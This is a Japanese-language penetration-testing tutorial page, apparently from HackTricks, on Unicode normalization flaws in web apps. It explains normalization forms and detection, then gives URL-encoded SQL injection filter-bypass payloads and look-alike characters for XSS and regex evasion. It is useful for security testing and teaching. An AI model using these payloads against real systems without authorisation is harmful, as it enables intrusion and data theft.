# Unicode正規化

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 背景

正規化は、異なるバイナリ表現を使用する可能性のある2つの文字列が、正規化後に同じバイナリ値を持つようにすることを保証します。

文字の間には2つの主な等価性のタイプがあります。「**カノニカル等価性**」と「**互換性等価性**」です。**カノニカル等価性**の文字は、印刷または表示されるときに同じ外観と意味を持つと想定されます。**互換性等価性**はより弱い等価性であり、2つの値は同じ抽象文字を表すかもしれませんが、異なる表示方法があります。**Unicode**標準では、**NFC、NFD、NFKC、NFKD**の4つの正規化アルゴリズムが定義されており、それぞれが異なる方法でカノニカルおよび互換性の正規化技術を適用します。詳細な技術については、Unicode.orgで詳細を読むことができます。

### Unicodeエンコーディング

Unicodeは相互運用性の問題を解決するために一部設計されたものでしたが、標準の進化、レガシーシステムのサポートの必要性、および異なるエンコーディング方法の必要性はまだ課題となる場合があります。Unicodeについて理解するためには、次の主なポイントを理解する必要があります。

* 各文字または記号は、数値値（「コードポイント」と呼ばれる）にマップされます。
* コードポイントの値（およびしたがって文字自体）は、メモリ内の1バイト以上で表されます。英語圏で使用されるLATIN-1文字は1バイトで表すことができます。他の言語では、より多くの文字があり、すべての異なるコードポイントを表すためにより多くのバイトが必要です（また、LATIN-1で使用されているものは使用できません）。
* 「エンコーディング」という用語は、文字がバイトのシリーズとして表される方法を意味します。最も一般的なエンコーディング規格はUTF-8で、このエンコーディング方式を使用すると、ASCII文字は1バイトで表すことができ、他の文字には最大4バイトが必要です。
* システムがデータを処理するとき、バイトストリームを文字に変換するために使用されたエンコーディングを知る必要があります。
* UTF-8が最も一般的ですが、UTF-16およびUTF-32という類似のエンコーディング規格もあります。それぞれの違いは、各文字を表すために使用されるバイト数です。つまり、UTF-16は最低2バイト（最大4バイト）を使用し、UTF-32はすべての文字に4バイトを使用します。

同じ文字を表す2つの異なるバイトをUnicodeが正規化する例：

![](<../../.gitbook/assets/image (156).png>)

**Unicodeの等価な文字のリストはこちらで見つけることができます:** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) および [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### 発見

Webアプリ内でエコーバックされる値を見つけることができれば、**「ケルビン記号」（U+0212A）**を送信してみることができます。これは**「K」に正規化**されます（`%e2%84%aa`として送信できます）。もし「K」がエコーバックされるならば、何らかの**Unicode正規化**が行われています。

他の**例**: `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` を**Unicode**にすると `Leonishan` です。

## **脆弱な例**

### **SQLインジェクションフィルタバイパス**

ユーザー入力を使用してSQLクエリを作成するために文字`'`を使用しているWebページを想像してください。このWebページは、セキュリティ対策として、ユーザー入力から文字`'`のすべての出現を**削除**しますが、その削除後、クエリの作成前にユーザーの入力を**Unicode**で**正規化**します。

その後、悪意のあるユーザーは、`' (0x27)` と等価な異なるUnicode文字（`%ef%bc%87`）を挿入することができます。入力が正規化されると、シングルクォートが作成され、**SQLインジェクションの脆弱性**が発生します。

![](<../../.gitbook/assets/image (157) (1).png>)

**いくつかの興味深いUnicode文字**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmapテンプレート

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS（クロスサイトスクリプティング）

以下の文字のいずれかを使用して、Webアプリをだますことができ、XSSを悪用することができます：

![](<../../.gitbook/assets/image (312) (1).png>)

たとえば、提案された最初のUnicode文字は、`%e2%89%ae`または`%u226e`として送信することができます。

![](<../../.gitbook/assets/image (215) (1).png>)

### 正規表現のフジング

バックエンドが正規表現でユーザー入力をチェックしている場合、入力が正規化されている可能性がありますが、使用されている場所では正規化されていないかもしれません。たとえば、オープンリダイレクトやSSRFでは、正規表現が送信されたURLを正規化しているかもしれませんが、そのままアクセスしています。

ツール[**recollapse**](https://github.com/0xacb/recollapse)は、バックエンドをフジングするために入力のバリエーションを生成することができます。詳細については、**github**とこの[**記事**](https://0xacb.com/2022/11/21/recollapse/)を参照してください。

## 参考文献

**このページのすべての情報は、次の場所から取得されました：** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/#**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)

**その他の参考文献：**

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクションを発見してください。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
